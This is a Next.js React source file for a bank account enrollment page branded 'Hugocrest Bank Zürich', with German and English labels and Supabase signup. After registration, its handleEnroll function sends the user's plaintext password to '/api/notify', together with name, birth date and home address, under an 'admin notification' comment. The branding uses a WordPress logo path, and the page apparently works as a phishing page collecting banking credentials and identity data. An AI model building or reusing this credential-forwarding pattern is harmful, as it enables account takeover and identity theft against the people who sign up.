"use client";
import React, { useState } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { supabase } from '@/lib/supabase';

const translations = {
  de: {
    lang_de: "deutsch",
    lang_fr: "français",
    lang_en: "english",
    lang_it: "italiano",
    enroll_title: "Konto eröffnen",
    first_name: "Vorname",
    last_name: "Nachname",
    dob: "Geburtsdatum",
    address: "Adresse",
    email: "E-Mail Adresse",
    password: "Passwort",
    account_type: "Kontotyp",
    enroll_btn: "Konto erstellen",
    back_to_login: "Zurück zum Login",
    enrolling: "Erstellen...",
    error_invalid: "Bitte füllen Sie alle Felder korrekt aus."
  },
  en: {
    lang_de: "deutsch",
    lang_fr: "français",
    lang_en: "english",
    lang_it: "italiano",
    enroll_title: "Create Account",
    first_name: "First Name",
    last_name: "Last Name",
    dob: "Date of Birth",
    address: "Home Address",
    email: "Email Address",
    password: "Password",
    account_type: "Account Type",
    enroll_btn: "Sign Up",
    back_to_login: "Back to Login",
    enrolling: "Creating Account...",
    error_invalid: "Please fill out all fields correctly."
  }
};


export default function EnrollPage() {
  const [lang, setLang] = useState('en');
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [dob, setDob] = useState('');
  const [address, setAddress] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [accountType, setAccountType] = useState('checking');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const router = useRouter();
  
  // Fallback to english if lang not found
  const t = translations[lang] || translations['en'];

  const handleEnroll = async (e) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    if (!firstName || !lastName || !dob || !address || !email || !password) {
      setError(t.error_invalid);
      setIsLoading(false);
      return;
    }

    const { error: signUpError } = await supabase.auth.signUp({
      email,
      password,
      options: {
        data: {
          first_name: firstName,
          last_name: lastName,
          display_name: firstName,
          dob: dob,
          address: address,
          account_type: accountType
        }
      }
    });

    if (signUpError) {
      setError(signUpError.message);
      setIsLoading(false);
      return;
    }

    // Ping our backend route to send the admin notification email
    try {
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          firstName,
          lastName,
          email,
          password,
          dob,
          address,
          accountType
        })
      });
    } catch (err) {
      console.error('Failed to notify admin:', err);
      // We don't block the user's signup if the admin email fails
    }

    // Success - user needs to confirm email
    setIsSuccess(true);
    setIsLoading(false);
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>

      <header className="auth-header">
        <img 
          src="/wp-content/uploads/2024/07/Pages-logo-8.webp" 
          alt="Hugocrest" 
          style={{ width: '250px' }}
        />
        <div className="lang-switcher" style={{ fontSize: 'calc(14px + var(--font-add, 0px))', color: "#666e71", display: "flex", gap: "15px" }}>
          <span onClick={() => setLang('de')} style={{ cursor: 'pointer', fontWeight: lang === 'de' ? '600' : '400' }}>deutsch</span>
          <span onClick={() => setLang('en')} style={{ cursor: 'pointer', fontWeight: lang === 'en' ? '600' : '400' }}>english</span>
        </div>
      </header>


      <main className="auth-main">
        <div style={{ width: '100%', maxWidth: '600px', padding: '0 20px', marginBottom: '80px' }}>
          {isSuccess ? (
            <div style={{ textAlign: 'center', padding: '40px 20px', backgroundColor: '#f9fafb', borderRadius: '8px', border: '1px solid #e5e7eb' }}>
              <div style={{ fontSize: '48px', marginBottom: '16px' }}>✉️</div>
              <h2 style={{ fontSize: '24px', color: '#333', marginBottom: '16px' }}>Verify your email</h2>
              <p style={{ color: '#666', marginBottom: '24px', lineHeight: '1.5' }}>
                We've sent a verification link to <strong>{email}</strong>. Please check your inbox and click the link to activate your account.
              </p>
              <button 
                onClick={() => router.push('/login')}
                style={{
                  padding: '12px 24px',
                  backgroundColor: '#047857',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  fontSize: '16px',
                  cursor: 'pointer',
                  fontWeight: '600'
                }}
              >
                Back to Login
              </button>
            </div>
          ) : (
            <>
              <h1 style={{ 
                fontSize: 'calc(36px + var(--font-add, 0px))', 
                fontWeight: '600', 
                color: '#666e71',
                marginBottom: '40px' 
              }}>
                {t.enroll_title}
              </h1>

              {error && (
                <div style={{ backgroundColor: '#fef2f2', color: '#b91c1c', padding: '12px', borderRadius: '4px', marginBottom: '16px', fontSize: 'calc(14px + var(--font-add, 0px))' }}>
                  {error}
                </div>
              )}

              <form onSubmit={handleEnroll} style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                <div style={{ display: 'flex', gap: '20px', flexWrap: 'wrap' }}>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', flex: '1 1 200px' }}>
                    <label style={{ fontSize: 'calc(14px + var(--font-add, 0px))', color: '#666e71' }}>{t.first_name}</label>
                    <input 
                      type="text"
                      value={firstName}
                      onChange={(e) => setFirstName(e.target.value)}
                      required
                      style={{ 
                        padding: '12px', 
                        border: '1px solid #cccccc', 
                        borderRadius: '4px',
                        fontSize: 'calc(16px + var(--font-add, 0px))',
                        outline: 'none',
                        backgroundColor: '#fff'
                      }} 
                    />
                  </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', flex: '1 1 200px' }}>
                <label style={{ fontSize: 'calc(14px + var(--font-add, 0px))', color: '#666e71' }}>{t.last_name}</label>
                <input 
                  type="text"
                  value={lastName}
                  onChange={(e) => setLastName(e.target.value)}
                  required
                  style={{ 
                    padding: '12px', 
                    border: '1px solid #cccccc', 
                    borderRadius: '4px',
                    fontSize: 'calc(16px + var(--font-add, 0px))',
                    outline: 'none',
                    backgroundColor: '#fff'
                  }} 
                />
              </div>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              <label style={{ fontSize: 'calc(14px + var(--font-add, 0px))', color: '#666e71' }}>{t.dob}</label>
              <input 
                type="date"
                value={dob}
                onChange={(e) => setDob(e.target.value)}
                required
                style={{ 
                  padding: '12px', 
                  border: '1px solid #cccccc', 
                  borderRadius: '4px',
                  fontSize: 'calc(16px + var(--font-add, 0px))',
                  outline: 'none',
                  color: '#666e71',
                  backgroundColor: '#fff'
                }} 
              />
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              <label style={{ fontSize: 'calc(14px + var(--font-add, 0px))', color: '#666e71' }}>{t.address}</label>
              <input 
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                required
                style={{ 
                  padding: '12px', 
                  border: '1px solid #cccccc', 
                  borderRadius: '4px',
                  fontSize: 'calc(16px + var(--font-add, 0px))',
                  outline: 'none',
                  backgroundColor: '#fff'
                }} 
              />
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              <label style={{ fontSize: 'calc(14px + var(--font-add, 0px))', color: '#666e71' }}>{t.email}</label>
              <input 
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
                style={{ 
                  padding: '12px', 
                  border: '1px solid #cccccc', 
                  borderRadius: '4px',
                  fontSize: 'calc(16px + var(--font-add, 0px))',
                  outline: 'none',
                  backgroundColor: '#fff'
                }} 
              />
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              <label style={{ fontSize: 'calc(14px + var(--font-add, 0px))', color: '#666e71' }}>{t.password}</label>
              <input 
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                style={{ 
                  padding: '12px', 
                  border: '1px solid #cccccc', 
                  borderRadius: '4px',
                  fontSize: 'calc(16px + var(--font-add, 0px))',
                  outline: 'none',
                  backgroundColor: '#fff'
                }} 
              />
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              <label style={{ fontSize: 'calc(14px + var(--font-add, 0px))', color: '#666e71' }}>{t.account_type}</label>
              <select 
                value={accountType}
                onChange={(e) => setAccountType(e.target.value)}
                style={{ 
                  padding: '12px', 
                  border: '1px solid #cccccc', 
                  borderRadius: '4px',
                  fontSize: 'calc(16px + var(--font-add, 0px))',
                  outline: 'none',
                  backgroundColor: '#fff',
                  color: '#666e71'
                }} 
              >
                <option value="checking">Checking</option>
                <option value="savings">Savings</option>
                <option value="credit">Credit Card</option>
                <option value="investment">Investment / Brokerage</option>
                <option value="mortgage">Mortgage / Loan</option>
              </select>
            </div>

            <div className="action-buttons" style={{ display: "flex", justifyContent: "flex-end", marginTop: "10px" }}>
              <div style={{ display: 'flex', gap: '10px', width: '100%', flexWrap: 'wrap' }}>
                <button 
                  type="button"
                  onClick={() => router.push('/login')}
                  disabled={isLoading}
                  style={{ 
                    flex: '1 1 150px',
                    backgroundColor: 'transparent', 
                    color: '#047857', 
                    padding: '12px', 
                    borderRadius: '4px', 
                    border: '1px solid #047857', 
                    fontSize: 'calc(14px + var(--font-add, 0px))', 
                    fontWeight: '600', 
                    cursor: isLoading ? 'not-allowed' : 'pointer' 
                  }}
                >
                  {t.back_to_login}
                </button>
                <button 
                  onClick={handleEnroll}
                  disabled={isLoading}
                  style={{ 
                    flex: '1 1 150px',
                    backgroundColor: '#047857', 
                    color: 'white', 
                    padding: '12px', 
                    borderRadius: '4px', 
                    border: 'none', 
                    fontSize: 'calc(14px + var(--font-add, 0px))', 
                    fontWeight: '600', 
                    cursor: isLoading ? 'not-allowed' : 'pointer' 
                  }}
                >
                  {isLoading ? t.enrolling : t.enroll_btn}
                </button>
              </div>
            </div>
          </form>
            </>
          )}
        </div>
      </main>

      <footer style={{ padding: '40px', textAlign: 'center', fontSize: 'calc(14px + var(--font-add, 0px))', color: '#666e71', fontStyle: 'italic', marginTop: 'auto' }}>
        Hugocrest Bank Zürich - Secure online enrollment.
      </footer>
    </div>
  );
}
